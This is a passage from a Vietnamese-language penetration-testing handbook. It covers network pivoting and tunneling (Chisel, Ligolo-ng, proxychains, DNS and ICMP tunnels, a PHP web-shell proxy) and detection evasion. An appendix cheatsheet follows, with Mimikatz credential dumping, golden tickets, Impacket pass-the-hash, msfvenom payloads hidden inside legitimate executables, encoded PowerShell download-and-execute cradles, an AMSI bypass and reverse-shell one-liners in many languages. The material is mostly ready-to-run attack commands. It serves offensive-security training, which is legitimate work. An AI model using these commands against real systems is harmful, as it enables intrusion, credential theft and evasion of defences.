chmod +x chisel_1.7.7_linux_amd64
mv chisel_1.7.7_linux_amd64 /usr/local/bin/chisel

# Tải và cài đặt trên Windows
# Tải từ https://github.com/jpillora/chisel/releases
# Đổi tên thành chisel.exe
```

### 8.3.2. Forward Tunneling với Chisel

```bash
# Thiết lập server trên máy tấn công
chisel server -p 8080 --host 0.0.0.0

# Thiết lập client trên máy pivot (forward tunneling)
chisel client attacker-ip:8080 9050:127.0.0.1:9050

# Sử dụng cùng với SSH dynamic port forwarding
ssh -D 9050 user@localhost
```

### 8.3.3. Reverse Tunneling với Chisel

```bash
# Thiết lập server trên máy tấn công
chisel server -p 8080 --reverse --host 0.0.0.0

# Thiết lập client trên máy pivot (reverse tunneling)
chisel client attacker-ip:8080 R:9050:socks

# Ngay bây giờ trên máy tấn công, bạn có một SOCKS proxy chạy trên cổng 9050
```

### 8.3.4. Ví dụ Chisel Nâng cao

```bash
# Sử dụng nhiều tunnel cùng lúc (forward)
chisel client attacker-ip:8080 3306:db-server:3306 8443:web-server:443

# Sử dụng nhiều tunnel cùng lúc (reverse)
chisel client attacker-ip:8080 R:3306:db-server:3306 R:8443:web-server:443

# Thiết lập tunnel qua HTTP proxy
chisel client --proxy https://corporate-proxy:8080 attacker-ip:8080 R:9050:socks

# Bảo vệ kết nối với mật khẩu
# Trên server
chisel server -p 8080 --auth user:pass --reverse --host 0.0.0.0
# Trên client
chisel client --auth user:pass attacker-ip:8080 R:9050:socks
```

## 8.4. Ligolo-ng

Ligolo-ng là công cụ tunneling hiện đại, được thiết kế đặc biệt cho kiểm thử thâm nhập, hỗ trợ nhiều tính năng nâng cao.

### 8.4.1. Cài đặt Ligolo-ng

```bash
# Tải và cài đặt trên máy tấn công
wget https://github.com/tnpitsecurity/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/tnpitsecurity/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
tar -xzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

### 8.4.2. Cấu hình Ligolo-ng

```bash
# Thiết lập interface tun trên máy tấn công
sudo ip tuntap add dev ligolo mode tun user $USER
sudo ip link set ligolo up

# Khởi động proxy trên máy tấn công
./proxy -selfcert

# Chạy agent trên máy pivot
./agent -connect attacker-ip:11601 -ignore-cert
```

### 8.4.3. Sử dụng Ligolo-ng cho Pivoting

```bash
# Trong giao diện proxy
# Liệt kê các agents kết nối
ligolo-ng » session

# Khởi động phiên với agent
ligolo-ng » session 0

# Liệt kê các interfaces trên agent
ligolo-ng » ifconfig

# Quét mạng từ agent
ligolo-ng » scan 10.10.10.0/24

# Thiết lập route thông qua agent
ligolo-ng » listener_add --addr 0.0.0.0:8080 --to 10.10.10.5:80

# Hoặc tạo tunnel động
ligolo-ng » start
# Thêm route trên máy tấn công
sudo ip route add 10.10.10.0/24 dev ligolo
```

### 8.4.4. Ví dụ Ligolo-ng Nâng cao

```bash
# Khởi động proxy với listener tùy chỉnh
./proxy -selfcert -laddr 0.0.0.0:11601

# Sử dụng agent qua proxy HTTP/SOCKS
./agent -connect attacker-ip:11601 -ignore-cert -proxy http://corporate-proxy:8080

# Thiết lập tunnel giữa hai mạng nội bộ
# Trên agent 1
ligolo-ng » tunnel_add --addr 192.168.1.0/24
# Trên agent 2
ligolo-ng » tunnel_add --addr 10.10.10.0/24
```

## 8.5. Dynamic Port Forwarding

Phần này đi sâu hơn vào kỹ thuật dynamic port forwarding và các công cụ liên quan.

### 8.5.1. Sử dụng Meterpreter

```bash
# Socks proxy với meterpreter
# Giả sử bạn đã có phiên meterpreter
meterpreter > run autoroute -s 10.10.10.0/24
[*] Adding route to 10.10.10.0/255.255.255.0...
[+] Added route to 10.10.10.0/255.255.255.0 via 10.10.5.11
meterpreter > background

msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server

# Sử dụng với proxychains
proxychains nmap -sT -Pn 10.10.10.5
```

### 8.5.2. Sử dụng SSF (Secure Socket Funneling)

```bash
# Tải SSF từ https://github.com/securesocketfunneling/ssf/releases

# Thiết lập SOCKS proxy với SSF
# Trên máy tấn công
./ssfd -p 8888

# Trên máy pivot
./ssf -F 9090 -p 8888 attacker-ip

# Cấu hình proxychains
echo "socks5 127.0.0.1 9090" >> /etc/proxychains.conf
```

### 8.5.3. Sử dụng Rpivot

```bash
# Tải rpivot từ https://github.com/klsecservices/rpivot

# Trên máy tấn công
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 9050

# Trên máy pivot
python client.py --server-ip attacker-ip --server-port 9999
```

## 8.6. Proxychains Configuration

Proxychains là công cụ quan trọng cho phép sử dụng các ứng dụng khác thông qua proxy SOCKS.

### 8.6.1. Cài đặt và Cấu hình Cơ bản

```bash
# Cài đặt proxychains
apt-get install proxychains

# Sửa file cấu hình
vim /etc/proxychains.conf
```

### 8.6.2. Các Mô hình Chuỗi Proxy

```bash
# Strict chain - tất cả proxy phải hoạt động
strict_chain

# Dynamic chain - bỏ qua proxy không hoạt động
dynamic_chain

# Random chain - sử dụng các proxy ngẫu nhiên
random_chain
chain_len = 3 # chiều dài chuỗi proxy
```

### 8.6.3. Cấu hình DNS

```bash
# Proxy DNS requests qua chuỗi
proxy_dns

# DNS subnet để routing
remote_dns_subnet 224

# Cấu hình timeout
tcp_read_time_out 15000
tcp_connect_time_out 8000
```

### 8.6.4. Ví dụ Danh sách Proxy

```bash
# Định dạng: type host port [user pass]
[ProxyList]
socks5  127.0.0.1 9050
socks4  10.10.5.11 1080
http    192.168.1.5 3128  user  password
```

### 8.6.5. Sử dụng Proxychains với các Công cụ Khác nhau

```bash
# Sử dụng với nmap
proxychains nmap -sT -Pn -n --top-ports 100 10.10.10.5

# Sử dụng với curl/wget
proxychains curl http://10.10.10.5
proxychains wget http://10.10.10.5/file.txt

# Sử dụng với metasploit
proxychains msfconsole

# Sử dụng với trình duyệt
proxychains firefox

# Sử dụng với SSH
proxychains ssh user@10.10.10.5

# Sử dụng với MySQL
proxychains mysql -h 10.10.10.5 -u root -p
```

## 8.7. Advanced Pivoting Techniques

Phần này bao gồm các kỹ thuật nâng cao và phức tạp hơn cho pivoting.

### 8.7.1. DNS Tunneling

```bash
# Sử dụng iodine cho DNS tunneling
# Trên máy tấn công (server)
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# Trên máy pivot (client)
iodine -f -P password tunnel.yourdomain.com

# Sau khi kết nối, bạn có thể sử dụng interface tun0
ssh -D 9050 10.0.0.2
```

### 8.7.2. ICMP Tunneling

```bash
# Sử dụng ptunnel (Ping Tunnel)
# Trên máy tấn công (server)
ptunnel -x password

# Trên máy pivot (client)
ptunnel -p attacker-ip -lp 8000 -da internal-server -dp 80 -x password

# Truy cập internal-server:80 qua localhost:8000
curl http://localhost:8000
```

### 8.7.3. HTTP Tunneling với reGeorg

```bash
# Tải reGeorg từ https://github.com/sensepost/reGeorg

# Upload tunnel.(aspx|ashx|jsp|php) lên web server

# Trên máy tấn công
python reGeorgSocksProxy.py -u http://compromised-website.com/tunnel.php -p 9050

# Sử dụng với proxychains
proxychains nmap -sT -Pn 10.10.10.5
```

### 8.7.4. Pivoting với Web Shells

```bash
# Sử dụng PHP web shell với SOCKS proxy
# Upload shell.php với nội dung sau
<?php
if (isset($_GET['proxy'])) {
    $address = $_GET['address'];
    $port = $_GET['port'];
    $data = '';
    $socket = fsockopen($address, $port);
    while (!feof($socket)) {
        $data .= fread($socket, 8192);
    }
    fclose($socket);
    echo $data;
}
?>

# Cấu hình công cụ SOCKS proxy tùy chỉnh để sử dụng shell
./custom_proxy.py -u http://compromised-website.com/shell.php -p 9050
```

### 8.7.5. Pivoting với Mạng Mesh

```bash
# Sử dụng tinc để tạo mạng mesh
# Cài đặt tinc
apt-get install tinc

# Cấu hình trên tất cả các máy
mkdir -p /etc/tinc/pivotnet/hosts
cat > /etc/tinc/pivotnet/tinc.conf << EOF
Name = attacker
AddressFamily = ipv4
Interface = tun0
EOF

# Tạo các files host và trao đổi giữa các nodes
# Xem thêm: https://www.tinc-vpn.org/documentation/
```

### 8.7.6. Pivoting qua IPv6

```bash
# Sử dụng socat để forward IPv6 traffic
socat TCP4-LISTEN:8080,fork TCP6:[2001:db8::1]:80

# Sử dụng SSH để tunnel IPv6
ssh -6 -L 8080:[2001:db8::1]:80 user@ipv6-pivot-host
```

## 8.8. Proxy Chains & Traversing Networks

### 8.8.1. Kỹ thuật Chuỗi Proxy Nâng cao

```bash
# Chuỗi proxychains qua nhiều hosts
echo "socks5 127.0.0.1 9050" > /tmp/proxychains.conf
proxychains -f /tmp/proxychains.conf ssh -D 9051 user@first-pivot

# Tạo file cấu hình mới
echo "socks5 127.0.0.1 9051" > /tmp/proxychains2.conf
proxychains -f /tmp/proxychains2.conf ssh -D 9052 user@second-pivot

# Cuối cùng sử dụng chuỗi hoàn chỉnh
echo "socks5 127.0.0.1 9052" > /tmp/proxychains3.conf
proxychains -f /tmp/proxychains3.conf nmap -sT -Pn 10.10.10.5
```

### 8.8.2. Sử dụng FoxyProxy với Firefox

```bash
# Cài đặt extension FoxyProxy Standard
# Firefox > Add-ons > Extensions > Search "FoxyProxy Standard"

# Cấu hình SOCKS proxy trong FoxyProxy
# - Title: "Pivot"
# - Proxy Type: "SOCKS5"
# - Proxy IP: "127.0.0.1"
# - Port: "9050"

# Bật FoxyProxy và chọn proxy "Pivot"
```

### 8.8.3. Tunneling qua Nhiều Mạng

```bash
# Ví dụ tình huống với 3 mạng
# Attacker -> 192.168.1.0/24 -> 10.10.10.0/24 -> 172.16.0.0/24

# Thiết lập route trên máy tấn công
# Giả sử pivot1 tại 192.168.1.5, pivot2 tại 10.10.10.5
ssh -D 9050 user@192.168.1.5
echo "socks5 127.0.0.1 9050" > /tmp/proxychains.conf

# SSH đến pivot2 qua pivot1
proxychains -f /tmp/proxychains.conf ssh -D 9051 user@10.10.10.5
echo "socks5 127.0.0.1 9051" > /tmp/proxychains2.conf

# Scan mạng 172.16.0.0/24 qua cả hai tunnels
proxychains -f /tmp/proxychains2.conf nmap -sT -Pn 172.16.0.5
```

## 8.9. Evasion Techniques

Kỹ thuật né tránh phát hiện khi sử dụng tunneling.

### 8.9.1. Obfuscating SSH Traffic

```bash
# Thay đổi cổng SSH để tránh filtering
ssh -p 443 -D 9050 user@pivot-host

# Sử dụng SteganoSSH
# Tham khảo: https://github.com/stealth/sshttp
```

### 8.9.2. Hiding Tunnels trong HTTPS

```bash
# Sử dụng stunnel để encrypt traffic
# Trên máy tấn công (server)
cat > /etc/stunnel/stunnel.conf << EOF
[proxy]
accept = 8443
connect = 127.0.0.1:9050
cert = /etc/stunnel/stunnel.pem
EOF
stunnel

# Trên máy pivot (client)
cat > /etc/stunnel/stunnel.conf << EOF
client = yes
[proxy]
accept = 9050
connect = attacker-ip:8443
EOF
stunnel
```

### 8.9.3. Intermittent Connections

```bash
# Kết nối ngắt quãng để giảm dấu vết mạng
# Sử dụng cron để kết nối theo lịch
echo "*/10 * * * * ssh -f -N -D 9050 user@pivot-host" | crontab -

# Sử dụng scripts tự động kết nối/ngắt kết nối
cat > /tmp/connect.sh << EOF
#!/bin/bash
while true; do
  ssh -f -N -D 9050 user@pivot-host
  sleep 300
  pkill -f "ssh -f -N -D 9050"
  sleep 60
done
EOF
chmod +x /tmp/connect.sh
```

### 8.9.4. Bandwidth Limiting

```bash
# Sử dụng trickle để giới hạn bandwidth
trickle -d 50 -u 10 ssh -D 9050 user@pivot-host

# Sử dụng cgroups để giới hạn tài nguyên
cgcreate -g cpu,memory:tunnel
cgset -r cpu.shares=100 tunnel
cgexec -g cpu,memory:tunnel ssh -D 9050 user@pivot-host
```

## 8.10. Post-Exploitation Pivoting

Sử dụng các công cụ post-exploitation để tạo tunnels.

### 8.10.1. Pivoting với Empire

```bash
# Sau khi có agent
usemodule management/socks
set Agent AGENT_NAME
execute

# Trong máy tấn công
proxychains nmap -sT -Pn 10.10.10.5
```

### 8.10.2. Pivoting với Cobalt Strike

```bash
# Sau khi thiết lập Beacon
# Tạo SOCKS proxy
beacon> socks 9050

# Thiết lập route
beacon> runas 10.10.10.0/24

# Sử dụng proxy
proxychains nmap -sT -Pn 10.10.10.5
```

### 8.10.3. Pivoting với Metasploit

```bash
# Sau khi thiết lập session
sessions -i 1
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 9050
run
```

---

# PHỤC LỤC: TOOLS CHEATSHEET

## Evil-WinRM

Evil-WinRM là công cụ mạnh mẽ để khai thác WinRM (Windows Remote Management) cho mục đích kiểm thử thâm nhập.

### Kết nối cơ bản

```bash
# Kết nối với username/password
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123!'

# Kết nối với NTLM hash (Pass-the-Hash)
evil-winrm -i 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:a23456789abcdef1234567890abcdef1'

# Sử dụng port tùy chỉnh
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123!' -P 5986

# Kết nối qua SSL (HTTPS)
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123!' -s

# Bỏ qua xác thực SSL
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123!' -s -c cert.pem -k key.pem
```

### Chức năng nâng cao

```bash
# Upload file đến máy mục tiêu
*Evil-WinRM* PS> upload /path/to/local/file.exe C:\Windows\Temp\file.exe

# Download file từ máy mục tiêu
*Evil-WinRM* PS> download C:\Windows\Temp\file.txt /path/to/local/directory/

# Tải Powershell scripts
*Evil-WinRM* PS> Invoke-Binary /opt/PowerUp.ps1
*Evil-WinRM* PS> Invoke-PowerShellScript

# Menu help
*Evil-WinRM* PS> menu

# Thực thi từ bộ nhớ (fileless execution)
*Evil-WinRM* PS> Invoke-Binary /path/to/binary.exe

# Bypass AMSI
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123!' -s -e
```

## Mimikatz

Mimikatz là công cụ mạnh mẽ để thu thập và khai thác thông tin xác thực trên Windows.

### Lệnh cơ bản

```powershell
# Chạy với quyền debug (cần Administrator)
mimikatz # privilege::debug

# Thu thập credentials trong bộ nhớ
mimikatz # sekurlsa::logonpasswords

# Thu thập Kerberos tickets
mimikatz # sekurlsa::tickets

# Xuất tất cả tickets
mimikatz # sekurlsa::tickets /export

# Dump LSASS
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# DCSync để dump thông tin từ DC
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Pass-the-Hash & Pass-the-Ticket

```powershell
# Pass-the-Hash (NTLM)
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:a23456789abcdef1234567890abcdef1 /run:cmd.exe

# Pass-the-Hash (AES)
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /aes256:a23456789abcdef1234567890abcdef1a23456789abcdef1234567890abcdef1 /run:cmd.exe

# Inject Kerberos ticket
mimikatz # kerberos::ptt ticket.kirbi

# Purge tickets
mimikatz # kerberos::purge
```

### Tạo Golden/Silver Tickets

```powershell
# Golden Ticket
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:krbtgt_hash /user:fake_admin /id:500 /ptt

# Silver Ticket (CIFS)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:fileserver.corp.local /service:cifs /rc4:service_account_hash /user:fake_user /ptt

# Tùy chỉnh thêm
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:krbtgt_hash /user:fake_admin /id:500 /groups:512,513,518,519,520 /ptt /ticket:ticket.kirbi /endin:87600 /renewmax:262800
```

### Lấy hash từ SAM

```powershell
# Dump SAM database
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Từ file SAM và SYSTEM
mimikatz # lsadump::sam /sam:C:\sam.save /system:C:\system.save
```

## Impacket

Impacket là thư viện và bộ công cụ Python đa năng để làm việc với các giao thức mạng. Dưới đây là các công cụ hữu ích nhất trong bộ Impacket.

### impacket-secretsdump

```bash
# Dump thông tin xác thực từ DC với credentials
impacket-secretsdump corp.local/administrator:Password123\!@192.168.1.10

# Dump thông tin xác thực với NTLM hash
impacket-secretsdump -hashes :a23456789abcdef1234567890abcdef1 corp.local/administrator@192.168.1.10

# Dump từ NTDS.dit và SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Dump từ SAM và SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### impacket-psexec

```bash
# Thực thi lệnh với credentials
impacket-psexec corp.local/administrator:Password123\!@192.168.1.10

# Thực thi lệnh với NTLM hash
impacket-psexec -hashes :a23456789abcdef1234567890abcdef1 corp.local/administrator@192.168.1.10

# Thực thi với Kerberos
impacket-psexec -k -no-pass corp.local/administrator@192.168.1.10

# Thực thi lệnh cụ thể
impacket-psexec corp.local/administrator:Password123\!@192.168.1.10 cmd.exe
```

### impacket-wmiexec

```bash
# Thực thi lệnh với credentials
impacket-wmiexec corp.local/administrator:Password123\!@192.168.1.10

# Thực thi lệnh với NTLM hash
impacket-wmiexec -hashes :a23456789abcdef1234567890abcdef1 corp.local/administrator@192.168.1.10

# Thực thi lệnh cụ thể
impacket-wmiexec corp.local/administrator:Password123\!@192.168.1.10 "ipconfig /all"
```

### impacket-GetUserSPNs (Kerberoasting)

```bash
# Liệt kê SPNs với credentials
impacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10

# Lấy TGS tickets
impacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 -request

# Lưu vào file output
impacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt
```

### impacket-GetNPUsers (AS-REP Roasting)

```bash
# Tìm tài khoản không yêu cầu Kerberos preauth
impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10

# Với file username
impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -usersfile users.txt

# Request hash và lưu vào file
impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep.txt
```

### impacket-smbclient

```bash
# Kết nối với shares
impacket-smbclient corp.local/administrator:Password123\!@192.168.1.10

# Kết nối với Pass-the-Hash
impacket-smbclient -hashes :a23456789abcdef1234567890abcdef1 corp.local/administrator@192.168.1.10
```

### impacket-ticketer

```bash
# Tạo Silver Ticket
impacket-ticketer -nthash service_account_hash -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -spn cifs/fileserver.corp.local fake_user

# Tạo Golden Ticket
impacket-ticketer -nthash krbtgt_hash -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -user-id 500 fake_admin
```

## Metasploit Reverse Shell & Obfuscation

### Tạo Reverse Shell với msfvenom

```bash
# Windows Reverse Shell (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o reverse.exe

# Windows Reverse Shell (dll)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f dll -o reverse.dll

# Linux Reverse Shell (elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o reverse.elf

# Web Payloads
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f aspx -o shell.aspx
```

### Obfuscation Techniques

```bash
# Sử dụng encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x64/xor -i 10 -f exe -o encoded_reverse.exe

# Shikata Ga Nai encoder (x86)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 15 -f exe -o encoded_reverse.exe

# Format avoidance
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o raw_shell.bin

# Nhúng payload vào file hợp pháp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x calc.exe -f exe -o legit_calc.exe

# Tùy chọn -k để giữ chức năng của file gốc
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x putty.exe -k -f exe -o legit_putty.exe
```

### Handler trong Metasploit

```bash
# Khởi động msfconsole
msfconsole -q

# Cấu hình handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
exploit -j

# Tùy chọn khác
set AutoRunScript post/windows/manage/migrate
set AutoRunScript post/windows/manage/smart_migrate
set EXITFUNC thread
```

### PowerShell Obfuscation

```powershell
# PowerShell Base64 Encoded Payload
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.5/Invoke-PowerShellTcp.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encodedCommand

# AMSI Bypass
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/payload.ps1')"

# Ngắt các chuỗi
$a='IEX ((new-object net.webclient).downlo'
$b='adstring("http://192.168.1.5/payload.ps1"))'
IEX ($a+$b)
```

### One-liner Reverse Shells

```bash
# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Bash
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Perl
perl -e 'use Socket;$i="192.168.1.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# PHP
php -r '$sock=fsockopen("192.168.1.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Netcat
nc -e /bin/bash 192.168.1.5 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.5 4444 >/tmp/f
```
